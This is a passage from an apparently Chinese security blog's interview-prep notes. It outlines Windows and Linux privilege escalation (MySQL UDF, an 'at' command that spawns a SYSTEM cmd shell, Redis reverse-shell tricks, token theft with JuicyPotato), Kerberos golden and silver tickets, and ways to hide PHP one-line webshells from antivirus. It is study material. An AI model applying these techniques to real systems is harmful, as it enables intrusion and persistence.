+<h2 id="常见提权"><a href="#常见提权" class="headerlink" title="常见提权"></a>常见提权</h2><h3 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h3><h4 id="1-mysql-UDF提权"><a href="#1-mysql-UDF提权" class="headerlink" title="1.mysql  UDF提权"></a>1.mysql  UDF提权</h4><p>UDF提权（利用了root 高权限，创建有cmd函数的udf.dll动态库，导出 那个文件后，就可以框输入 cmd，mof（系统会创建一个临时文件，创建的时候用的是system，把cmd命令放在mof上执行）</p>
+<p>提权的<strong>前提</strong>：</p>
+<ul>
+<li>mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib&#x2F;plugin文件夹下</li>
+<li>mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:windows\system32目录，在windows server - - 2000下放置在c:winnt\system32目录。</li>
+<li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。拥有可以将udf.dll写入相应目录的权限。</li>
+<li>版本大于5.1的udf.dll放到mysql安装目录的libplugin文件夹才能创建自定义函数。目录默认是不存在的需要自己创建，在安装目录下创建libplugin文件夹，然后将udf.dll导出到这个目录。</li>
+</ul>
+<p>利用msf进行UDF提权</p>
+<p>使用mysql_udf_payload模块<br>适应于5.5.9以下</p>
+<h4 id="2-2003-at提权-0点计划任务-执行cmd窗口"><a href="#2-2003-at提权-0点计划任务-执行cmd窗口" class="headerlink" title="2. 2003  at提权     0点计划任务   执行cmd窗口"></a>2. 2003  at提权     0点计划任务   执行cmd窗口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 00:00 /interaction cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>sc提权</p>
+<h4 id="3-redis未授权提权"><a href="#3-redis未授权提权" class="headerlink" title="3.redis未授权提权"></a>3.redis未授权提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1).利用计划任务执行命令反弹shell</span><br><span class="line"></span><br><span class="line">(2).写ssh-keygen公钥然后使用私钥登录</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-令牌窃取配合烂土豆提权"><a href="#4-令牌窃取配合烂土豆提权" class="headerlink" title="4.令牌窃取配合烂土豆提权"></a>4.令牌窃取配合烂土豆提权</h4><p>如果单单用令牌窃取,可能权限太低,无法窃取。例如,如果是web权限(IIS类似的服务权限)</p>
+<p>非服务类用户权限无法窃取成功(原理)</p>
+<p>过程:上传烂土豆-执行烂土豆-利用窃取模块-窃取SYSTEM-成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.利用msf生成后门，监听端口</span><br><span class="line">2.反弹shell后运行烂土豆进行提权</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-常用的补丁提权，syteminfo复制系统信息，拿去辅助提权。"><a href="#5-常用的补丁提权，syteminfo复制系统信息，拿去辅助提权。" class="headerlink" title="5. 常用的补丁提权，syteminfo复制系统信息，拿去辅助提权。"></a>5. 常用的补丁提权，syteminfo复制系统信息，拿去辅助提权。</h4><h3 id="LINUX提权"><a href="#LINUX提权" class="headerlink" title="LINUX提权"></a>LINUX提权</h3><h4 id="1-内核漏洞脏牛提权"><a href="#1-内核漏洞脏牛提权" class="headerlink" title="1.内核漏洞脏牛提权"></a><strong>1.内核漏洞脏牛提权</strong></h4><h4 id="2-计划任务提权"><a href="#2-计划任务提权" class="headerlink" title="2.计划任务提权"></a>2.计划任务提权</h4><h4 id="3-sudu提权"><a href="#3-sudu提权" class="headerlink" title="3.sudu提权"></a>3.sudu提权</h4><h4 id="4-第三方服务提权-比如数据库"><a href="#4-第三方服务提权-比如数据库" class="headerlink" title="4.第三方服务提权 比如数据库"></a>4.第三方服务提权 比如数据库</h4><h2 id="内网渗透思路"><a href="#内网渗透思路" class="headerlink" title="内网渗透思路"></a>内网渗透思路</h2><ul>
+<li>提权</li>
+<li>权限维持</li>
+<li>内网信息收集</li>
+<li>口令爆破</li>
+<li>凭据窃取</li>
+<li>纵向渗透</li>
+<li>拿下域控</li>
+</ul>
+<h3 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h3><p>白银票据通常用于攻击域控，黄金票据则用于拿下域控后权限维持，且黄金票据是伪造发票人，而白银票据则是伪造门票。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">黄金票据</span><br><span class="line"></span><br><span class="line">黄金票据就是伪造krbtgt用户的TGT票据，krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户</span><br><span class="line"></span><br><span class="line">利用前提：</span><br><span class="line"></span><br><span class="line">拿到域控(没错就是拿到域控QAQ),适合做权限维持</span><br><span class="line">有krbtgt用户的hash值(aeshash ntlmhash等都可以,后面指定一下算法就行了)</span><br></pre></td></tr></table></figure>
+
+<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>采取shellcode方式，来借助第三方直接加载到内存中、采取调用微软自带来执行Shellcode，利用微软的签名，从而绕过反病毒软件。</p>
+<h3 id="一句话木马免杀"><a href="#一句话木马免杀" class="headerlink" title="一句话木马免杀"></a>一句话木马免杀</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">一、assert()</span><br><span class="line">如果过滤了eval，可以使用assert绕过</span><br><span class="line"></span><br><span class="line">二、字符串拼接</span><br><span class="line">当过滤了eval、assert两个关键字时，可以用字符串拼接的方式。介绍substr_replace()函数</span><br><span class="line"></span><br><span class="line">三、函数</span><br><span class="line">可以利用函数来构造一句话木马</span><br><span class="line"></span><br><span class="line">四 base64加解密</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drblack000.github.io">Drblack</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drblack000.github.io/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/">https://drblack000.github.io/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drblack000.github.io" target="_blank">Drblack'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></div><div class="post_share"><div class="social-share" data-image="/img/1000.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/25/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="/images"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">/images</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/20/%E4%B8%80%E6%AE%B5%E7%AE%80%E8%BF%B0/" title="一段简述"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">一段简述</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/05/20/%E4%B8%80%E6%AE%B5%E7%AE%80%E8%BF%B0/" title="一段简述"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-20</div><div class="title">一段简述</div></div></a></div><div><a href="/2023/05/25/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="&#x2F;images"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-25</div><div class="title">&#x2F;images</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1000.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Drblack</div><div class="author-info__description">努力就会一直幸运</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/drblack000"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drblack000" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:drblack_di@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">linux常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94linux"><span class="toc-number">2.</span> <span class="toc-text">应急响应linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows"><span class="toc-number">3.</span> <span class="toc-text">应急响应windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90"><span class="toc-number">5.</span> <span class="toc-text">溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AF%E6%8A%A5"><span class="toc-number">6.</span> <span class="toc-text">误报</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEWebshell%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">寻找Webshell的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E5%88%80"><span class="toc-number">8.</span> <span class="toc-text">菜刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">9.</span> <span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E"><span class="toc-number">10.</span> <span class="toc-text">冰蝎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">11.</span> <span class="toc-text">哥斯拉</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">12.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">13.</span> <span class="toc-text">nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number"></span> <span class="toc-text">中间件漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS"><span class="toc-number">0.1.</span> <span class="toc-text">IIS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache"><span class="toc-number">0.2.</span> <span class="toc-text">Apache</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx"><span class="toc-number">0.3.</span> <span class="toc-text">Nginx</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat"><span class="toc-number">0.4.</span> <span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#weblogic"><span class="toc-number">0.4.1.</span> <span class="toc-text">weblogic</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E5%8A%A0%E5%9B%BA"><span class="toc-number">1.</span> <span class="toc-text">SSH加固</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="toc-number">2.</span> <span class="toc-text">安全加固</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%92%E6%9F%A5"><span class="toc-number">3.</span> <span class="toc-text">内存马排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">进程排查思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E6%A1%86%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">登陆框可能存在的漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%AD%97%E6%AE%B5"><span class="toc-number">6.</span> <span class="toc-text">HTTP字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC"><span class="toc-number">7.</span> <span class="toc-text">挖矿木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-cookie-token%E5%8C%BA%E5%88%AB"><span class="toc-number">8.</span> <span class="toc-text">session cookie token区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E4%BA%86cdn%E7%9A%84%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP"><span class="toc-number">9.</span> <span class="toc-text">做了cdn的网站如何获取真实IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.</span> <span class="toc-text">redis未授权漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf"><span class="toc-number">11.</span> <span class="toc-text">ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E7%AB%AF%E5%8F%A3%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">12.</span> <span class="toc-text">常见的高危端口有哪些</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%B4%9E%E6%B5%81%E7%A8%8B"><span class="toc-number"></span> <span class="toc-text">挖洞流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number"></span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson"><span class="toc-number">1.</span> <span class="toc-text">Fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jboss"><span class="toc-number">2.</span> <span class="toc-text">Jboss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">shiro反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro"><span class="toc-number">4.</span> <span class="toc-text">Shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-1"><span class="toc-number">5.</span> <span class="toc-text">weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">PHP反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83"><span class="toc-number"></span> <span class="toc-text">常见提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">windows提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-mysql-UDF%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">1.mysql  UDF提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2003-at%E6%8F%90%E6%9D%83-0%E7%82%B9%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-%E6%89%A7%E8%A1%8Ccmd%E7%AA%97%E5%8F%A3"><span class="toc-number">1.2.</span> <span class="toc-text">2. 2003  at提权     0点计划任务   执行cmd窗口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">3.redis未授权提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E9%85%8D%E5%90%88%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">4.令牌窃取配合烂土豆提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%B8%B8%E7%94%A8%E7%9A%84%E8%A1%A5%E4%B8%81%E6%8F%90%E6%9D%83%EF%BC%8Csyteminfo%E5%A4%8D%E5%88%B6%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E6%8B%BF%E5%8E%BB%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83%E3%80%82"><span class="toc-number">1.5.</span> <span class="toc-text">5. 常用的补丁提权，syteminfo复制系统信息，拿去辅助提权。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LINUX%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">LINUX提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text">1.内核漏洞脏牛提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">2.计划任务提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-sudu%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">3.sudu提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83-%E6%AF%94%E5%A6%82%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.4.</span> <span class="toc-text">4.第三方服务提权 比如数据库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number"></span> <span class="toc-text">内网渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.</span> <span class="toc-text">黄金票据和白银票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-number"></span> <span class="toc-text">免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text">一句话木马免杀</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/09/vulnstack%20%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/" title="无题">无题</a><time datetime="2023-09-09T11:01:38.922Z" title="发表于 2023-09-09 19:01:38">2023-09-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/25/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="/images">/images</a><time datetime="2023-05-25T13:31:41.000Z" title="发表于 2023-05-25 21:31:41">2023-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/" title="HVV中级常见面试问题">HVV中级常见面试问题</a><time datetime="2023-05-21T11:01:41.000Z" title="发表于 2023-05-21 19:01:41">2023-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/20/%E4%B8%80%E6%AE%B5%E7%AE%80%E8%BF%B0/" title="一段简述">一段简述</a><time datetime="2023-05-20T10:01:41.000Z" title="发表于 2023-05-20 18:01:41">2023-05-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Drblack</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
